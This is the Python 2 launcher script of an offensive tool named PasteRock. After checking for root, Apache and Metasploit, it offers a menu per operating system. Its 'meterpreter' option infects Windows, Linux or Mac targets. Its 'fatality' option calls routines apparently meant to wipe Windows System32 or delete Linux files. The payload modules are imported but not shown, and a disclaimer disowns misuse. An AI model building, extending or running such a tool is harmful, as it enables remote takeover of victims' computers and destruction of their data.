#-*- coding: utf-8 -*-
#Autor: Andrés Montoya (SpyRock)
#No me hago responsable del mal uso que este se le pueda dar.
#!/usr/bin/python
import os
import sys
from linux import *
from osx import *
from windows import *
from colores import *
from banner import *
if not os.geteuid() == 0:
			sys.exit("""\033[1;91m\n[!] PasteRock necesita permisos de root. ¯\_(ツ)_/¯\n\033[1;m""")
else:

	os.system("clear")
	print bcolors.BOLD+banners()
	print bcolors.payload+"Visita "+bcolors.apache+"--->"+bcolors.payload+" http://spyrockos.aegae.com/"
	print bcolors.payload+"Youtube " +bcolors.apache+"--->"+bcolors.payload+" https://www.youtube.com/c/SpyRockLinux"
	print bcolors.payload+"Facebook " +bcolors.apache+"--->"+bcolors.payload+" https://www.facebook.com/spyrockos/\n"
	
	if os.path.exists("/usr/bin/pasterock"):
		pass
	else:
		sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Por favor instale PasteRock!")
	if os.path.exists("/var/www/html/"):
		print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Iniciando Apache2...!\n"
		os.system("service apache2 start")
	else:
		sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Por favor instale PasteRock!")
	if os.path.exists("/opt/metasploit-framework"):
		if os.path.exists("/usr/share/metasploit-framework"):
			pass
	else:
	    sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Por favor instale PasteRock!")
		
	print bcolors.payload+"["+bcolors.apache+"1"+bcolors.payload+"]"+bcolors.WARNING+"Windows"
	print bcolors.payload+"["+bcolors.apache+"2"+bcolors.payload+"]"+bcolors.WARNING+"Linux"
	print bcolors.payload+"["+bcolors.apache+"3"+bcolors.payload+"]"+bcolors.WARNING+"Mac OSX"
	print bcolors.payload+"\n["+bcolors.apache+"99"+bcolors.payload+"]"+bcolors.WARNING+"Salir\n"
		
	plataforma=raw_input(bcolors.WARNING+"Paste" + bcolors.OKBLUE + "Rock"+ "\033[91m" +": "+"\033[1m")
	if (plataforma == "1"):
		g=raw_input("\033[1m"+"eliga (meterpreter/fatality) ")
		if g == "meterpreter":
			g=windows()
			g.windowsinfect()
		elif g == "fatality":
			g=windowsrm()
			g.system32()
		else:
			sys.exit("Error")
	elif (plataforma == "2"):
		f=raw_input("\033[1m"+"eliga (meterpreter/fatality) ")
		if f == "meterpreter":
			f=linux()
			f.linuxinfect()
		elif f == "fatality":
			f=LinuxDelete()
			f.linuxrm()
		else:
			sys.exit("Error")
	elif (plataforma == "3"):
		e=osx()
		e.osxinfect()
	elif (plataforma == "salir" or plataforma=="exit" or plataforma=="99"):
		sys.exit()
	else:
		sys.exit(bcolors.FAIL("\nError.\n"))
